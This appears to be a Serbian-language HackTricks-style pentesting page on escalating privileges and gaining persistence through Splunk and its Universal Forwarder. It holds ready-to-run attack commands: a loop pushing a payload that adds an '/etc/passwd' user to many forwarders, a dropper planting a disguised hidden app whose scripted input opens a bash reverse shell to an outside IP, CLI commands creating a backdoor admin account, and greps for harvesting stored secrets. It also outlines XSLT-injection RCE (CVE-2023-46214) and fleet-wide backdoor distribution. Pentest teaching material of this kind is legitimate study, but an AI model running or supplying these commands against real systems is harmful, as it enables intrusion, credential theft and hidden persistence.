# Splunk LPE i Persistence

Ako prilikom **interne** ili **eksterne enumeracije** mašine pronađete da je **Splunk pokrenut** (obično **8000** za web UI i **8089** za management API), važeći kredencijali se često mogu pretvoriti u **code execution** kroz instalaciju aplikacija, scripted inputs ili management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Ako Splunk radi kao **root**, to često odmah dovodi do **privilege escalation**.<sup>[[1]](#references)</sup>

Ako vam je potrebna samo generička remote attack surface, enumeracija ili app-upload RCE putanja, pogledajte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ako ste **već root** i Splunk servis ne osluškuje samo na localhost-u, možete ukrasti **Splunk password hashes**, povratiti **encrypted secrets** ili postaviti **malicious app** kako biste održali persistence lokalno ili na više forwardera.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Zanimljive lokalne datoteke

Kada dobijete pristup hostu na kojem rade Splunk ili Splunk Universal Forwarder, ovo su obično najzanimljivije putanje:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Važni artefakti:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni Splunk korisnici i hash vrednosti lozinki.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ključ koji Splunk koristi za šifrovanje tajni sačuvanih u nekoliko `.conf` fajlova.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: početni admin bootstrap fajl; koristan kod gold image-ova i grešaka prilikom provisioninga. Ignoriše se ako `etc/passwd` već postoji.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mesto na kom se scripted inputs najčešće omogućavaju.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** ili **`$SPLUNK_HOME/etc/apps/`**: dobra mesta za skrivanje persistent app-a ili proveru onoga što se već distribuira.<sup>[[11]](#references)</sup>

## Rezime Splunk Universal Forwarder Agent Exploit-a

Za više detalja pogledajte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo rezime.<sup>[[1]](#references)</sup>

**Pregled Exploit-a:**
Exploit usmeren na Splunk Universal Forwarder (UF) omogućava napadačima sa **lozinkom agenta** da izvrše proizvoljan kod na sistemima na kojima agent radi, potencijalno kompromitujući veliki deo okruženja.<sup>[[1]](#references)</sup>

**Zašto funkcioniše:**

- UF management servis je često izložen na **TCP 8089**.<sup>[[6]](#references)</sup>
- Napadači mogu da se autentifikuju na API i nalože forwarderu da instalira **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- Isti primitive može da se koristi lokalno za **LPE** ili udaljeno za **RCE**.<sup>[[5]](#references)</sup>
- Javni alati kao što je **SplunkWhisperer2** automatski kreiraju app bundle i mogu da prilagode payload-e za Linux mete.<sup>[[5]](#references)</sup>

**Uobičajeni načini za pronalaženje lozinke:**

- Cleartext kredencijali u dokumentaciji, skriptama, share-ovima ili deployment automatizaciji.<sup>[[1]](#references)</sup>
- Hash vrednosti lozinki unutar `$SPLUNK_HOME/etc/passwd`, nakon čega sledi offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden image-ovi ili ostaci provisioninga, kao što je `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Uticaj:**

- Izvršavanje koda na nivou SYSTEM/root naloga na svakom kompromitovanom hostu.<sup>[[1]](#references)</sup>
- Deployment persistent app-ova, backdoor-a ili ransomware-a.<sup>[[1]](#references)</sup>
- Onemogućavanje ili manipulisanje telemetry podacima pre njihovog prosleđivanja.<sup>[[1]](#references)</sup>

**Primer komande za exploit:**

Originalni izveštaj prikazuje sledeću petlju za slanje payload-a na više forwardera.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Javno dostupni exploit-i:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence putem Scripted Inputs ili Malicious Apps

Ako imate **write access nad filesystemom** kao `root`/`splunk`, ili authenticated access za instaliranje aplikacija, veoma pouzdan mehanizam persistence-a je ubacivanje **custom app-a** sa **scripted input-om**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk-ova sopstvena dokumentacija očekuje da se scripted inputs nalaze u direktorijumu aplikacije i da budu omogućeni iz fajla `inputs.conf`.<sup>[[10]](#references)</sup>

Tipičan raspored:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalni `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Brzi Linux dropper (koristeći tu dokumentovanu strukturu aplikacije):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Napomene:

- Isti trik funkcioniše na **Universal Forwarder** koristeći `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Napadači se često stapaju s okruženjem tako što izmene legitimni add-on umesto da kreiraju očigledno zlonamernu aplikaciju.<sup>[[2]](#references)</sup>
- Na **deployment serveru**, postavljanje zlonamerne aplikacije unutar `deployment-apps/` pretvara se u **fleet-wide persistence**, jer forwarderi periodično proveravaju promene, preuzimaju ažurirane aplikacije i često se restartuju da bi ih primenili.<sup>[[11]](#references)[[12]](#references)</sup>

## Krađa akreditiva i preuzimanje administratorske kontrole

Ako možete da čitate Splunkove lokalne datoteke, obično postoje dva dobra cilja: povratiti **Splunk admin pristup** i povratiti **šifrovane servisne akreditive**.<sup>[[8]](#references)</sup>

### Heševi lozinki i lokalni korisnici

Splunk čuva lokalne podatke za autentifikaciju u datoteci `etc/passwd`. U zavisnosti od deploymenta, razbijanje te datoteke može otkriti važeće akreditive za web UI i management API.<sup>[[1]](#references)[[7]](#references)</sup>

Ako već imate važeće **admin** akreditive, a Splunk koristi svoj **native** authentication backend, sam CLI može da se koristi za persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i šifrovane vrednosti

Splunk koristi `etc/auth/splunk.secret` za zaštitu osetljivih vrednosti sačuvanih u više konfiguracionih fajlova. Ako možete da ukradete i **secret** i relevantne **`.conf` fajlove**, često možete da povratite ili ponovo upotrebite:<sup>[[8]](#references)</sup>

- zajedničke secrets za forwarder/indexer, kao što je `pass4SymmKey`
- lozinke privatnih TLS ključeva, kao što je `sslPassword`
- LDAP bind credentials, kao što je `bindDNPassword`

Ovo može podržati **lateral movement** čak i kada sama Splunk admin lozinka ne može da se crack-uje.<sup>[[8]](#references)</sup>

### Zloupotreba `user-seed.conf`

`user-seed.conf` se koristi samo pri prvom pokretanju ili kada `etc/passwd` ne postoji. Zbog toga je manje koristan na aktivnom sistemu, ali je veoma zanimljiv u:<sup>[[9]](#references)</sup>

- kompromitovanim installation template-ima
- container image-ima
- unattended provisioning workflow-ima
- appliance-ima kod kojih se Splunk automatski ponovo inicijalizuje

U tim slučajevima, postavljanje vrednosti `HASHED_PASSWORD` generisane pomoću `splunk hash-passwd` daje vam tih način da ponovo dobijete admin pristup nakon redeployment-a.<sup>[[9]](#references)</sup>

## Zloupotreba Splunk Queries

Za dodatne detalje pogledajte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Korisna novija tehnika jeste zloupotreba **user-supplied XSLT-a** u ranjivim verzijama Splunk Enterprise-a, čime se authenticated account sa niskim privilegijama može pretvoriti u **OS command execution** kao korisnik `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Tok na visokom nivou:<sup>[[3]](#references)[[4]](#references)</sup>

1. Autentifikujte se na Splunk.
2. Otpremite zlonamerni **XSL** fajl kroz funkcionalnost za preview/upload.
3. Naterajte Splunk da prikaže rezultate pretrage pomoću otpremljenog stylesheet-a iz **dispatch** direktorijuma.
4. Iskoristite XSLT payload za upisivanje fajla ili pokretanje izvršavanja kroz Splunk search pipeline (na primer, pristupanjem internoj funkcionalnosti kao što je `runshellscript`).

Važan offensive zaključak jeste da ovaj put omogućava **post-auth RCE bez potrebe za app upload-om**. Na Linux-u se obično dobija pristup nalogu **`splunk`**, što je i dalje vredno jer taj korisnik često poseduje application tree, može da čita secrets i može da postavi persistent apps koje preživljavaju gubitak shell-a.<sup>[[3]](#references)[[4]](#references)</sup>

Reprezentativna putanja korišćena tokom exploitation-a je:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ako Splunk radi sa previše privilegija ili ako korisnik `splunk` ima pristup opasnim skriptama, servisnim jedinicama koje mogu da se menjaju ili lošim `sudo` pravilima, ovo postaje čist **LPE** lanac.

## References

- [1] [Zloupotreba Splunk Forwarders za RCE i Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Čuvajte se TraitorWare-a: Korišćenje Splunk-a za Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analiza CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Promena podrazumevanih vrednosti](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Postavljanje bezbednih lozinki na više servera](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Podešavanje scripted input-a](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Kreiranje deployment aplikacija](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Kako se odvijaju deployment ažuriranja](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Konfigurisanje korisnika pomoću CLI-ja](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
